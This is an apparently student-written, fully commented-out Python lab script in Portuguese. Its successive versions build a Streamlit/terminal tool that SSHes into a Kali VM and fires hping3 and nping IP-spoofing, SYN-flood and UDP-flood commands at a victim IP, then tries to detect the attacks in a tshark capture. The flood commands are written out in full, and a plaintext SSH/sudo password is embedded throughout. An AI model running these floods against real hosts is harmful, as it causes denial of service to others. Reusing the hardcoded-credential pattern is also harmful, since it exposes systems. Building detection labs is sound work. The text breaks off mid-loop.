# PARTE 1 - CRIAR UM MENU

# import subprocess
# import time
# import paramiko
# import ipaddress
# from scapy.all import rdpcap, IP
#
# # 👉 Menu de escolha do tipo de ataque
# print("Selecione o tipo de ataque que deseja simular:")
# print("1️⃣  IP Spoofing")
# print("2️⃣  TCP SYN Flood")
# print("3️⃣  UDP Flood")
# ataque_escolhido = input("Digite o número da opção desejada: ").strip()
#
#
#
# # Comandos de ataque com base na escolha
# if ataque_escolhido == "1":
#     # comando_ataque = f"echo 'npfnm1msv' | sudo -S hping3 -a {ip_spoofado} -S {ip_vitima} -p 80 -c 10"
#     # 👉 Entrada dos IPs
#     ip_kali = input("🖥️  IP da máquina Kali: ").strip()
#     ip_spoofado = input("🎭 IP que será usado como spoof (falso): ").strip()
#     ip_vitima = input("🎯 IP da máquina alvo (vítima): ").strip()
#
#     # 1. Iniciar captura tshark na máquina host (ajuste a interface correta)
#     print("\n🎥 Iniciando captura com tshark...\n")
#     tshark_proc = subprocess.Popen([
#         r"C:\Program Files\Wireshark\tshark.exe", "-i", "ethernet", "-w", "captura_IPspoofing.pcapng"
#     ])
#
#     # 2. Conectar via SSH na VM Kali e executar ataque spoofing com hping3
#     print(f"💥 Conectando via SSH na VM Kali ({ip_kali}) para iniciar o ataque...")
#     ssh = paramiko.SSHClient()
#     ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
#     ssh.connect(hostname=ip_kali, username="alessandro", password="npfnm1msv")
#
#     print(f"🚀 Disparando spoofing: {ip_spoofado} → {ip_vitima} (porta 80)...")
#     # comando_ataque = f"sudo hping3 -a {ip_spoofado} -S {ip_vitima} -p 80 -c 10"
#     comando_ataque = f"echo 'npfnm1msv' | sudo -S hping3 -a {ip_spoofado} -S {ip_vitima} -p 80 -c 10"
#
#     # stdin, stdout, stderr = ssh.exec_command(comando_ataque)
#     # stdout.channel.recv_exit_status()
#     # print(stdout.read().decode())
#     # print(stderr.read().decode())
#     stdin, stdout, stderr = ssh.exec_command(comando_ataque)
#     output = stdout.read().decode()
#     errors = stderr.read().decode()
#     print(output)
#     print(errors)
#
#     # Aguarda alguns segundos para garantir captura
#     time.sleep(20)
#
#     # 3. Finalizar captura
#     print("🛑 Encerrando captura tshark...")
#     tshark_proc.terminate()
#     time.sleep(3)
#
#     # 4. Analisar o arquivo capturado
#     print("📂 Transferindo arquivo de captura...")
#     arquivo_pcap = "captura_IPspoofing.pcapng"
#
#     # 5. Rodar a análise dos pacotes
#     print("🔎 Analisando captura...\n")
#
#     ranges_privados = [
#         ipaddress.ip_network("10.0.0.0/8"),
#         ipaddress.ip_network("172.16.0.0/12"),
#         ipaddress.ip_network("192.168.0.0/16"),
#     ]
#
#     # IPs confiáveis
#     ips_confiaveis = {
#         "192.168.1.3", "192.168.1.13", "192.168.1.6",  # Exemplo: sua máquina física
#         ip_spoofado,  # Opcional: ignora o spoofador para focar em terceiros
#     }
#
#
#     def ip_privado(ip_str):
#         ip_obj = ipaddress.ip_address(ip_str)
#         return any(ip_obj in rede for rede in ranges_privados)
#
#
#     # Carrega pacotes
#     pkts = rdpcap(arquivo_pcap)
#
#     # Filtra e mostra suspeitas
#     print("\n🔎 Pacotes com IP de origem privado (spoofing suspeito):\n")
#     for pkt in pkts:
#         if IP in pkt:
#             ip_origem = pkt[IP].src
#             # if ip_privado(ip_origem) and ip_origem not in ips_confiaveis:
#             #     print(f"⚠️ Spoofing suspeito: {ip_origem} → {pkt[IP].dst}")
#             if ip_privado(ip_origem) and ip_origem not in ips_confiaveis:
#                 print(f"⚠️ Spoofing suspeito: {ip_origem} → {pkt[IP].dst}")
#             # elif not ip_privado(ip_origem) and ip_privado(pkt[IP].dst):
#             #     print(f"⚠️ Possível spoof externo: {ip_origem} → {pkt[IP].dst}")
# elif ataque_escolhido == "2":
#     comando_ataque = f"echo 'npfnm1msv' | sudo -S hping3 {ip_vitima} -S -p 80 --flood"
# elif ataque_escolhido == "3":
#     comando_ataque = f"echo 'npfnm1msv' | sudo -S hping3 {ip_vitima} --udp -p 80 --flood"
# else:
#     print("❌ Opção inválida. Abortando...")
#     tshark_proc.terminate()
#     exit()







# import streamlit as st
# import subprocess
# import time
# import paramiko
# import ipaddress
# from scapy.all import rdpcap, IP
#
# st.title("🔐 Simulador de Ataques de Rede")
#
# # Menu de escolha
# ataque_opcao = st.selectbox("Selecione o tipo de ataque que deseja simular:", [
#     "Selecione...",
#     "1️⃣ IP Spoofing",
#     "2️⃣ TCP SYN Flood",
#     "3️⃣ UDP Flood"
# ])
#
# # Entradas de IPs
# ip_kali = st.text_input("🖥️ IP da máquina Kali", value="192.168.1.9")
# ip_spoofado = st.text_input("🎭 IP spoofado (falso)", value="3.3.3.3")
# ip_vitima = st.text_input("🎯 IP da máquina vítima", value="192.168.1.11")
#
# if st.button("🚀 Iniciar ataque"):
#     if "IP Spoofing" in ataque_opcao:
#         st.write("🎥 Iniciando captura com Tshark...")
#
#         tshark_proc = subprocess.Popen([
#             r"C:\Program Files\Wireshark\tshark.exe", "-i", "ethernet", "-w", "captura_IPspoofing.pcapng"
#         ])
#
#         st.write("🔐 Conectando na VM Kali...")
#         ssh = paramiko.SSHClient()
#         ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
#         ssh.connect(hostname=ip_kali, username="alessandro", password="npfnm1msv")
#
#         comando = f"echo 'npfnm1msv' | sudo -S hping3 -a {ip_spoofado} -S {ip_vitima} -p 80 -c 10"
#         stdin, stdout, stderr = ssh.exec_command(comando)
#         output = stdout.read().decode()
#         errors = stderr.read().decode()
#         st.code(output or errors)
#
#         time.sleep(15)
#         st.write("🛑 Encerrando captura...")
#         tshark_proc.terminate()
#
#         st.write("📂 Analisando pacotes...")
#
#         def ip_privado(ip_str):
#             ip_obj = ipaddress.ip_address(ip_str)
#             redes_privadas = [
#                 ipaddress.ip_network("10.0.0.0/8"),
#                 ipaddress.ip_network("172.16.0.0/12"),
#                 ipaddress.ip_network("192.168.0.0/16"),
#             ]
#             return any(ip_obj in rede for rede in redes_privadas)
#
#         ips_confiaveis = {ip_spoofado, "192.168.1.6", "192.168.1.3", "192.168.1.13"}
#
#         pkts = rdpcap("captura_IPspoofing.pcapng")
#         suspeitos = []
#         for pkt in pkts:
#             if IP in pkt:
#                 ip_origem = pkt[IP].src
#                 if ip_privado(ip_origem) and ip_origem not in ips_confiaveis:
#                     suspeitos.append(f"⚠️ Spoofing suspeito: {ip_origem} → {pkt[IP].dst}")
#
#         st.write("🔍 Resultados da análise:")
#         for linha in suspeitos:
#             st.warning(linha)
#
#     elif "SYN Flood" in ataque_opcao:
#         st.info("🔧 Ataque TCP SYN Flood ainda em construção.")
#         # Aqui entraria o comando correspondente para SYN Flood
#
#     elif "UDP Flood" in ataque_opcao:
#         st.info("🔧 Ataque UDP Flood ainda em construção.")
#         # Aqui entraria o comando correspondente para UDP Flood
#
#     else:
#         st.error("❌ Selecione um tipo de ataque válido.")






# import streamlit as st
# import subprocess
# import time
# import paramiko
# import ipaddress
# from scapy.all import rdpcap, IP
#
# st.title("🔐 Simulador de Ataques de Rede")
#
# # Menu de escolha
# ataque_opcao = st.selectbox("Selecione o tipo de ataque que deseja simular:", [
#     "Selecione...",
#     "1️⃣ IP Spoofing",
#     "2️⃣ TCP SYN Flood",
#     "3️⃣ UDP Flood"
# ])
#
# # Entradas de IPs
# ip_kali = st.text_input("🖥️ IP da máquina Kali")
# ip_spoofado = st.text_input("🎭 IP spoofado (falso)")
# ip_vitima = st.text_input("🎯 IP da máquina vítima")
#
# # Verifica se todos os campos obrigatórios estão preenchidos
# campos_ok = all([ataque_opcao != "Selecione...", ip_kali.strip(), ip_spoofado.strip(), ip_vitima.strip()])
#
# # Mostra o botão somente se os campos estiverem preenchidos
# if not campos_ok:
#     st.warning("⚠️ Preencha todos os campos acima para iniciar a simulação.")
# else:
#     if st.button("🚀 Iniciar ataque"):
#         if "IP Spoofing" in ataque_opcao:
#             st.write("🎥 Iniciando captura com Tshark...")
#
#             tshark_proc = subprocess.Popen([
#                 r"C:\Program Files\Wireshark\tshark.exe", "-i", "ethernet", "-w", "captura_IPspoofing.pcapng"
#             ])
#
#             st.write("🔐 Conectando na VM Kali...")
#             ssh = paramiko.SSHClient()
#             ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
#             ssh.connect(hostname=ip_kali, username="alessandro", password="npfnm1msv")
#
#             comando = f"echo 'npfnm1msv' | sudo -S hping3 -a {ip_spoofado} -S {ip_vitima} -p 80 -c 10"
#             stdin, stdout, stderr = ssh.exec_command(comando)
#             output = stdout.read().decode()
#             errors = stderr.read().decode()
#             st.code(output or errors)
#
#             time.sleep(15)
#             st.write("🛑 Encerrando captura...")
#             tshark_proc.terminate()
#
#             st.write("📂 Analisando pacotes...")
#
#             def ip_privado(ip_str):
#                 ip_obj = ipaddress.ip_address(ip_str)
#                 redes_privadas = [
#                     ipaddress.ip_network("10.0.0.0/8"),
#                     ipaddress.ip_network("172.16.0.0/12"),
#                     ipaddress.ip_network("192.168.0.0/16"),
#                 ]
#                 return any(ip_obj in rede for rede in redes_privadas)
#
#             ips_confiaveis = {ip_spoofado, "192.168.1.6", "192.168.1.3", "192.168.1.13"}
#
#             pkts = rdpcap("captura_IPspoofing.pcapng")
#             suspeitos = []
#             for pkt in pkts:
#                 if IP in pkt:
#                     ip_origem = pkt[IP].src
#                     if ip_privado(ip_origem) and ip_origem not in ips_confiaveis:
#                         suspeitos.append(f"⚠️ Spoofing suspeito: {ip_origem} → {pkt[IP].dst}")
#
#             st.write("🔍 Resultados da análise:")
#             for linha in suspeitos:
#                 st.warning(linha)
#
#         elif "SYN Flood" in ataque_opcao:
#             st.info("🔧 Ataque TCP SYN Flood ainda em construção.")
#
#         elif "UDP Flood" in ataque_opcao:
#             st.info("🔧 Ataque UDP Flood ainda em construção.")
#
#         else:
#             st.error("❌ Selecione um tipo de ataque válido.")







# import streamlit as st
# import subprocess
# import time
# import paramiko
# import ipaddress
# from scapy.all import rdpcap, IP
#
# st.title("🔐 Simulador de Ataques de Rede")
#
# # Menu de escolha
# ataque_opcao = st.selectbox("Selecione o tipo de ataque que deseja simular:", [
#     "Selecione...",
#     "1️⃣ IP Spoofing",
#     "2️⃣ TCP SYN Flood"
# ])
#
# # Inputs dinâmicos conforme o tipo de ataque
# ip_kali = ip_spoofado = ip_vitima = ""
#
# if ataque_opcao != "Selecione...":
#     ip_kali = st.text_input("🖥️ IP da máquina Kali")
#
#     if "IP Spoofing" in ataque_opcao:
#         ip_spoofado = st.text_input("🎭 IP spoofado (falso)")
#         ip_vitima = st.text_input("🎯 IP da máquina vítima")
#     elif "SYN Flood" in ataque_opcao:
#         ip_vitima = st.text_input("🎯 IP da máquina vítima")
#
# # Verifica se os campos necessários estão preenchidos
# campos_preenchidos = False
# if "IP Spoofing" in ataque_opcao:
#     campos_preenchidos = all([ip_kali.strip(), ip_spoofado.strip(), ip_vitima.strip()])
# elif "SYN Flood" in ataque_opcao:
#     campos_preenchidos = all([ip_kali.strip(), ip_vitima.strip()])
#
# # Se não estiverem preenchidos, mostra aviso
# if ataque_opcao != "Selecione..." and not campos_preenchidos:
#     st.warning("⚠️ Preencha todos os campos obrigatórios acima para iniciar.")
#
# # Botão para iniciar ataque
# if campos_preenchidos and st.button("🚀 Iniciar ataque"):
#     st.write("🔐 Conectando na VM Kali...")
#     ssh = paramiko.SSHClient()
#     ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
#     ssh.connect(hostname=ip_kali, username="alessandro", password="npfnm1msv")
#
#     if "IP Spoofing" in ataque_opcao:
#         st.write("🎥 Iniciando captura com Tshark...")
#         tshark_proc = subprocess.Popen([
#             r"C:\Program Files\Wireshark\tshark.exe", "-i", "ethernet", "-w", "captura_IPspoofing.pcapng"
#         ])
#
#         comando = f"echo 'npfnm1msv' | sudo -S hping3 -a {ip_spoofado} -S {ip_vitima} -p 80 -c 10"
#         stdin, stdout, stderr = ssh.exec_command(comando)
#         output = stdout.read().decode()
#         errors = stderr.read().decode()
#         st.code(output or errors)
#
#         time.sleep(15)
#         st.write("🛑 Encerrando captura...")
#         tshark_proc.terminate()
#
#         st.write("📂 Analisando pacotes...")
#
#         def ip_privado(ip_str):
#             ip_obj = ipaddress.ip_address(ip_str)
#             redes_privadas = [
#                 ipaddress.ip_network("10.0.0.0/8"),
#                 ipaddress.ip_network("172.16.0.0/12"),
#                 ipaddress.ip_network("192.168.0.0/16"),
#             ]
#             return any(ip_obj in rede for rede in redes_privadas)
#
#         ips_confiaveis = {ip_spoofado, "192.168.1.6", "192.168.1.3", "192.168.1.13"}
#
#         pkts = rdpcap("captura_IPspoofing.pcapng")
#         suspeitos = []
#         for pkt in pkts:
#             if IP in pkt:
#                 ip_origem = pkt[IP].src
#                 if ip_privado(ip_origem) and ip_origem not in ips_confiaveis:
#                     suspeitos.append(f"⚠️ Spoofing suspeito: {ip_origem} → {pkt[IP].dst}")
#
#         st.write("🔍 Resultados da análise:")
#         for linha in suspeitos:
#             st.warning(linha)
#
#     elif "SYN Flood" in ataque_opcao:
#         st.write("🚀 Iniciando ataque TCP SYN Flood com hping3...")
#         comando = f"echo 'npfnm1msv' | sudo -S hping3 {ip_vitima} -S -p 80 --flood"
#         stdin, stdout, stderr = ssh.exec_command(comando)
#         output = stdout.read().decode()
#         errors = stderr.read().decode()
#         st.code(output or errors)
#         st.success("✅ Ataque TCP SYN Flood executado.")







# import streamlit as st
# import subprocess
# import time
# import paramiko
# import ipaddress
# from scapy.all import rdpcap, IP
#
# st.title("🔐 Simulador de Ataques de Rede")
#
# # Menu de escolha
# ataque_opcao = st.selectbox("Selecione o tipo de ataque que deseja simular:", [
#     "Selecione...",
#     "1️⃣ IP Spoofing",
#     "2️⃣ TCP SYN Flood",
#     "3️⃣ UDP Flood"
# ])
#
# # Entradas de IPs
# if "IP Spoofing" in ataque_opcao or "SYN Flood" in ataque_opcao:
#     ip_kali = st.text_input("🖥️ IP da máquina Kali", value="")
#     ip_vitima = st.text_input("🎯 IP da máquina vítima", value="")
# else:
#     ip_kali = ""
#     ip_vitima = ""
#
# if "IP Spoofing" in ataque_opcao:
#     ip_spoofado = st.text_input("🎭 IP spoofado (falso)", value="")
# else:
#     ip_spoofado = ""
#
# if st.button("🚀 Iniciar ataque"):
#     if "IP Spoofing" in ataque_opcao:
#         st.write("🎥 Iniciando captura com Tshark...")
#
#         tshark_proc = subprocess.Popen([
#             r"C:\Program Files\Wireshark\tshark.exe", "-i", "ethernet", "-w", "captura_IPspoofing.pcapng"
#         ])
#
#         st.write("🔐 Conectando na VM Kali...")
#         ssh = paramiko.SSHClient()
#         ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
#         ssh.connect(hostname=ip_kali, username="alessandro", password="npfnm1msv")
#
#         comando = f"echo 'npfnm1msv' | sudo -S hping3 -a {ip_spoofado} -S {ip_vitima} -p 80 -c 10"
#         stdin, stdout, stderr = ssh.exec_command(comando)
#         output = stdout.read().decode()
#         errors = stderr.read().decode()
#         st.code(output or errors)
#
#         time.sleep(15)
#         st.write("🛑 Encerrando captura...")
#         tshark_proc.terminate()
#
#         st.write("📂 Analisando pacotes...")
#
#         def ip_privado(ip_str):
#             ip_obj = ipaddress.ip_address(ip_str)
#             redes_privadas = [
#                 ipaddress.ip_network("10.0.0.0/8"),
#                 ipaddress.ip_network("172.16.0.0/12"),
#                 ipaddress.ip_network("192.168.0.0/16"),
#             ]
#             return any(ip_obj in rede for rede in redes_privadas)
#
#         ips_confiaveis = {ip_spoofado, "192.168.1.6", "192.168.1.3", "192.168.1.13"}
#
#         pkts = rdpcap("captura_IPspoofing.pcapng")
#         suspeitos = []
#         for pkt in pkts:
#             if IP in pkt:
#                 ip_origem = pkt[IP].src
#                 if ip_privado(ip_origem) and ip_origem not in ips_confiaveis:
#                     suspeitos.append(f"⚠️ Spoofing suspeito: {ip_origem} → {pkt[IP].dst}")
#
#         st.write("🔍 Resultados da análise:")
#         for linha in suspeitos:
#             st.warning(linha)
#
#     elif "SYN Flood" in ataque_opcao:
#         st.write("🎥 Iniciando captura com Tshark...")
#
#         tshark_proc = subprocess.Popen([
#             r"C:\Program Files\Wireshark\tshark.exe", "-i", "ethernet", "-w", "captura_SYNflood.pcapng"
#         ])
#
#         st.write("🔐 Conectando na VM Kali...")
#         ssh = paramiko.SSHClient()
#         ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
#         ssh.connect(hostname=ip_kali, username="alessandro", password="npfnm1msv")
#
#         comando = f"echo 'npfnm1msv' | sudo -S timeout 10s hping3 {ip_vitima} -S -p 80 --flood"
#         st.write("🚀 Disparando SYN Flood (duração: 10 segundos)...")
#         stdin, stdout, stderr = ssh.exec_command(comando)
#         output = stdout.read().decode()
#         errors = stderr.read().decode()
#         st.code(output or errors)
#
#         time.sleep(15)
#         st.write("🛑 Encerrando captura...")
#         tshark_proc.terminate()
#
#         st.success("✅ Ataque TCP SYN Flood executado e captura finalizada.")
#
#     elif "UDP Flood" in ataque_opcao:
#         st.info("🔧 Ataque UDP Flood ainda em construção.")
#
#     else:
#         st.error("❌ Selecione um tipo de ataque válido.")



# até aqui consegui rodar com ip spoofing e TCP syn flood mas realmente a detecção parece não estar funcionado, mas okay
# amanhã fazer as opções para os outros
# a ideia é criar um prototipo e depois vamos melhorando


# import streamlit as st
# import subprocess
# import time
# import paramiko
# import ipaddress
# from scapy.all import rdpcap, IP, TCP
#
# st.title("🔐 Simulador de Ataques de Rede")
#
# # Menu de escolha
# ataque_opcao = st.selectbox("Selecione o tipo de ataque que deseja simular:", [
#     "Selecione...",
#     "1️⃣ IP Spoofing",
#     "2️⃣ TCP SYN Flood",
#     "3️⃣ UDP Flood"
# ])
#
# # Entrada de IP para todos os ataques
# ip_kali = st.text_input("🖥️ IP da máquina Kali", value="")
# ip_vitima = st.text_input("🎯 IP da máquina vítima", value="")
#
# # Entrada adicional apenas para IP Spoofing
# if "IP Spoofing" in ataque_opcao:
#     ip_spoofado = st.text_input("🎭 IP spoofado (falso)", value="")
#
# if st.button("🚀 Iniciar ataque"):
#     if not ip_kali or not ip_vitima or ("IP Spoofing" in ataque_opcao and not ip_spoofado):
#         st.warning("❗ Preencha todos os campos necessários para este tipo de ataque.")
#     else:
#         st.write("🎥 Iniciando captura com Tshark...")
#         nome_arquivo = "captura_temp.pcapng"
#
#         tshark_proc = subprocess.Popen([
#             r"C:\Program Files\Wireshark\tshark.exe", "-i", "ethernet", "-w", nome_arquivo
#         ])
#
#         st.write("🔐 Conectando na VM Kali...")
#         ssh = paramiko.SSHClient()
#         ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
#         ssh.connect(hostname=ip_kali, username="alessandro", password="npfnm1msv")
#
#         if "IP Spoofing" in ataque_opcao:
#             comando = f"echo 'npfnm1msv' | sudo -S hping3 -a {ip_spoofado} -S {ip_vitima} -p 80 -c 10"
#         elif "SYN Flood" in ataque_opcao:
#             comando = f"echo 'npfnm1msv' | sudo -S timeout 10s hping3 {ip_vitima} -S -p 80 --flood"
#         else:
#             comando = "echo 'npfnm1msv' | echo 'Em desenvolvimento...'"
#
#         st.code(f"Executando: {comando}")
#         stdin, stdout, stderr = ssh.exec_command(comando)
#         output = stdout.read().decode()
#         errors = stderr.read().decode()
#         st.code(output or errors)
#
#         time.sleep(15)
#         st.write("🛑 Encerrando captura...")
#         tshark_proc.terminate()
#         time.sleep(2)
#
#         # Resultado da análise
#         st.write("📂 Analisando pacotes...")
#         pkts = rdpcap(nome_arquivo, count=10000)
#
#         if "IP Spoofing" in ataque_opcao:
#             redes_privadas = [
#                 ipaddress.ip_network("10.0.0.0/8"),
#                 ipaddress.ip_network("172.16.0.0/12"),
#                 ipaddress.ip_network("192.168.0.0/16"),
#             ]
#             ips_confiaveis = {ip_spoofado, "192.168.1.6", "192.168.1.3", "192.168.1.13"}
#
#             def ip_privado(ip_str):
#                 ip_obj = ipaddress.ip_address(ip_str)
#                 return any(ip_obj in rede for rede in redes_privadas)
#
#             suspeitos = []
#             for pkt in pkts:
#                 if IP in pkt:
#                     ip_origem = pkt[IP].src
#                     if ip_privado(ip_origem) and ip_origem not in ips_confiaveis:
#                         suspeitos.append(f"⚠️ Spoofing suspeito: {ip_origem} → {pkt[IP].dst}")
#
#             st.write("🔍 Resultados da análise:")
#             for linha in suspeitos:
#                 st.warning(linha)
#
#         elif "SYN Flood" in ataque_opcao:
#             syn_count = {}
#             ack_count = {}
#
#             for pkt in pkts:
#                 if pkt.haslayer(IP) and pkt.haslayer(TCP):
#                     ip_src = pkt[IP].src
#                     tcp_flags = pkt[TCP].flags
#
#                     if tcp_flags == 'S':  # Apenas SYN
#                         syn_count[ip_src] = syn_count.get(ip_src, 0) + 1
#                     elif 'A' in tcp_flags and 'S' not in tcp_flags:  # Apenas ACK
#                         ack_count[ip_src] = ack_count.get(ip_src, 0) + 1
#
#             ataque_detectado = False
#             st.write("🔍 Resultados da análise:")
#             for ip in syn_count:
#                 syns = syn_count[ip]
#                 acks = ack_count.get(ip, 0)
#                 ratio = acks / syns if syns > 0 else 0
#
#                 if syns > 100 and ratio < 0.1:
#                     st.error(f"⚠️ Possível SYN Flood detectado do IP {ip} ({syns} SYNs, {acks} ACKs, taxa ACK/SYN = {ratio:.2f})")
#                     ataque_detectado = True
#
#             if not ataque_detectado:
#                 st.success("✅ Nenhum SYN Flood detectado.")
#
#         else:
#             st.info("🔧 Análise para este ataque ainda em desenvolvimento.")




# import streamlit as st
# import subprocess
# import time
# import paramiko
# import ipaddress
# from scapy.all import rdpcap, IP, TCP, UDP
#
# st.set_page_config(page_title="Simulador de Ataques de Rede", layout="centered")
# st.title("🔐 Simulador de Ataques de Rede")
#
# # Menu de escolha
# ataque_opcao = st.selectbox("Selecione o tipo de ataque que deseja simular:", [
#     "Selecione...",
#     "1️⃣ IP Spoofing",
#     "2️⃣ TCP SYN Flood",
#     "3️⃣ UDP Flood"
# ])
#
# ip_kali = st.text_input("🖥️ IP da máquina Kali", value="")
# ip_vitima = st.text_input("🎯 IP da máquina vítima", value="")
#
# # Entrada adicional para IP Spoofing
# ip_spoofado = ""
# if "IP Spoofing" in ataque_opcao:
#     ip_spoofado = st.text_input("🎭 IP spoofado (falso)", value="")
#
# if st.button("🚀 Iniciar ataque"):
#     if not ip_kali or not ip_vitima or ("IP Spoofing" in ataque_opcao and not ip_spoofado):
#         st.warning("❗ Preencha todos os campos necessários.")
#     else:
#         nome_arquivo = "captura_temp.pcapng"
#         interface = "6"  # Altere conforme o índice certo da sua rede em `tshark -D`
#
#         st.write("🎥 Iniciando captura com Tshark...")
#         tshark_proc = subprocess.Popen([
#             r"C:\Program Files\Wireshark\tshark.exe", "-i", interface, "-a", "duration:20", "-w", nome_arquivo
#         ])
#
#         time.sleep(3)
#         st.write("🔐 Conectando na VM Kali...")
#         ssh = paramiko.SSHClient()
#         ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
#         ssh.connect(hostname=ip_kali, username="alessandro", password="npfnm1msv")
#
#         # Comando para cada ataque
#         if "IP Spoofing" in ataque_opcao:
#             comando = f"echo 'npfnm1msv' | sudo -S hping3 -a {ip_spoofado} -S {ip_vitima} -p 80 -c 10"
#         elif "SYN Flood" in ataque_opcao:
#             comando = f"echo 'npfnm1msv' | sudo -S timeout 10s hping3 {ip_vitima} -S -p 80 --flood"
#         elif "UDP Flood" in ataque_opcao:
#             comando = f"echo 'npfnm1msv' | sudo -S timeout 15s nping --udp -p 80 --rate 3000 {ip_vitima}"
#         else:
#             comando = "echo 'npfnm1msv' | echo 'Comando não definido'"
#
#         st.code(f"Executando: {comando}")
#         stdin, stdout, stderr = ssh.exec_command(comando)
#         output = stdout.read().decode()
#         errors = stderr.read().decode()
#         st.code(output or errors)
#
#         time.sleep(5)
#         st.write("🛑 Encerrando captura...")
#         tshark_proc.terminate()
#         time.sleep(2)
#
#         st.write("📂 Analisando pacotes capturados...")
#         pkts = rdpcap(nome_arquivo, count=10000)
#
#         st.subheader("📊 Resumo dos primeiros pacotes:")
#         for pkt in pkts[:5]:
#             st.text(pkt.summary())
#
#         st.subheader("🔍 Resultados da análise:")
#
#         if "IP Spoofing" in ataque_opcao:
#             redes_privadas = [
#                 ipaddress.ip_network("10.0.0.0/8"),
#                 ipaddress.ip_network("172.16.0.0/12"),
#                 ipaddress.ip_network("192.168.0.0/16"),
#             ]
#             ips_confiaveis = {ip_spoofado, "192.168.1.6", "192.168.1.3"}
#
#             def ip_privado(ip_str):
#                 ip_obj = ipaddress.ip_address(ip_str)
#                 return any(ip_obj in rede for rede in redes_privadas)
#
#             suspeitos = []
#             for pkt in pkts:
#                 if IP in pkt:
#                     ip_origem = pkt[IP].src
#                     if ip_privado(ip_origem) and ip_origem not in ips_confiaveis:
#                         suspeitos.append(f"⚠️ Spoofing suspeito: {ip_origem} → {pkt[IP].dst}")
#             for linha in suspeitos:
#                 st.warning(linha)
#             if not suspeitos:
#                 st.success("✅ Nenhum spoofing suspeito detectado.")
#
#         elif "SYN Flood" in ataque_opcao:
#             syn_count = {}
#             ack_count = {}
#
#             for pkt in pkts:
#                 if pkt.haslayer(IP) and pkt.haslayer(TCP):
#                     ip_src = pkt[IP].src
#                     flags = pkt[TCP].flags
#                     if flags == 'S':  # SYN
#                         syn_count[ip_src] = syn_count.get(ip_src, 0) + 1
#                     elif 'A' in flags and 'S' not in flags:  # ACK sem SYN
#                         ack_count[ip_src] = ack_count.get(ip_src, 0) + 1
#
#             ataque_detectado = False
#             for ip in syn_count:
#                 syns = syn_count[ip]
#                 acks = ack_count.get(ip, 0)
#                 ratio = acks / syns if syns > 0 else 0
#                 if syns > 100 and ratio < 0.1:
#                     st.error(f"⚠️ Possível SYN Flood detectado do IP {ip} ({syns} SYNs, {acks} ACKs, taxa ACK/SYN = {ratio:.2f})")
#                     ataque_detectado = True
#
#             if not ataque_detectado:
#                 st.success("✅ Nenhum SYN Flood detectado.")
#
#         elif "UDP Flood" in ataque_opcao:
#             udp_count = {}
#             for pkt in pkts:
#                 if pkt.haslayer(IP) and pkt.haslayer(UDP):
#                     ip_src = pkt[IP].src
#                     udp_count[ip_src] = udp_count.get(ip_src, 0) + 1
#
#             ataque_detectado = False
#             for ip, count in udp_count.items():
#                 if count > 500:
#                     st.error(f"⚠️ Possível UDP Flood detectado do IP {ip} ({count} pacotes UDP).")
#                     ataque_detectado = True
#
#             if not ataque_detectado:
#                 st.success("✅ Nenhum UDP Flood detectado.")
#
#         else:
#             st.info("🔧 Análise para este tipo de ataque ainda está em desenvolvimento.")


# aqui funcionando para ip spoofing, TCP e UDP Flood

# import subprocess
# import time
# import paramiko
# import ipaddress
# from scapy.all import rdpcap, IP, TCP, UDP
#
# # Função auxiliar
# def ip_privado(ip_str):
#     ip_obj = ipaddress.ip_address(ip_str)
#     redes_privadas = [
#         ipaddress.ip_network("10.0.0.0/8"),
#         ipaddress.ip_network("172.16.0.0/12"),
#         ipaddress.ip_network("192.168.0.0/16"),
#     ]
#     return any(ip_obj in rede for rede in redes_privadas)
#
# # Menu
# print("🔐 Simulador de Ataques de Rede (Terminal)\n")
# print("1️⃣ IP Spoofing")
# print("2️⃣ TCP SYN Flood")
# print("3️⃣ UDP Flood")
# opcao = input("\nSelecione o tipo de ataque (1-3): ").strip()
#
# ip_kali = input("🖥️ IP da máquina Kali: ").strip()
# ip_vitima = input("🎯 IP da máquina vítima: ").strip()
#
# if opcao == "1":
#     ip_spoofado = input("🎭 IP spoofado (falso): ").strip()
#
# # Interface correta: VMnet8 = ID 4
# interface_vmnet8 = "4"
#
# # Iniciar captura
# nome_arquivo = "captura_ataque.pcapng"
# print(f"\n🎯 Interface de captura detectada: {interface_vmnet8} (VMnet8)")
# print("\n🎥 Iniciando captura com Tshark...\n")
# tshark_proc = subprocess.Popen([
#     r"C:\Program Files\Wireshark\tshark.exe", "-i", interface_vmnet8, "-w", nome_arquivo
# ])
#
# time.sleep(2)
#
# # SSH e ataque
# print("🔐 Conectando na VM Kali...\n")
# ssh = paramiko.SSHClient()
# ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
# ssh.connect(hostname=ip_kali, username="alessandro", password="npfnm1msv")
#
# if opcao == "1":
#     comando = f"echo 'npfnm1msv' | sudo -S hping3 -a {ip_spoofado} -S {ip_vitima} -p 80 -c 10"
# elif opcao == "2":
#     comando = f"echo 'npfnm1msv' | sudo -S timeout 10s hping3 {ip_vitima} -S -p 80 --flood"
# elif opcao == "3":
#     comando = f"echo 'npfnm1msv' | sudo -S timeout 10s nping --udp -p 80 --rate 3000 {ip_vitima}"
# else:
#     print("❌ Opção inválida.")
#     exit()
#
# print(f"🚀 Executando ataque:\n{comando}\n")
# stdin, stdout, stderr = ssh.exec_command(comando)
# print(stdout.read().decode())
# print(stderr.read().decode())
# ssh.close()
#
# print("⌛ Aguardando término do ataque...")
# time.sleep(12)
#
# print("🛑 Encerrando captura...\n")
# tshark_proc.terminate()
# time.sleep(2)
#
# print("📂 Analisando pacotes capturados...\n")
# pkts = rdpcap(nome_arquivo)
#
# # IP Spoofing
# if opcao == "1":
#     ips_confiaveis = {ip_spoofado, "192.168.1.6", "192.168.1.3", "192.168.1.13"}
#     suspeitos = []
#     for pkt in pkts:
#         if IP in pkt:
#             src = pkt[IP].src
#             if ip_privado(src) and src not in ips_confiaveis:
#                 suspeitos.append(f"⚠️ Spoofing suspeito: {src} → {pkt[IP].dst}")
#     if suspeitos:
#         print("🔍 IPs suspeitos detectados:\n")
#         for alerta in suspeitos:
#             print(alerta)
#     else:
#         print("✅ Nenhum spoofing detectado.")
#
# # SYN Flood
# elif opcao == "2":
#     syn_count = {}
#     ack_count = {}
#     for pkt in pkts:
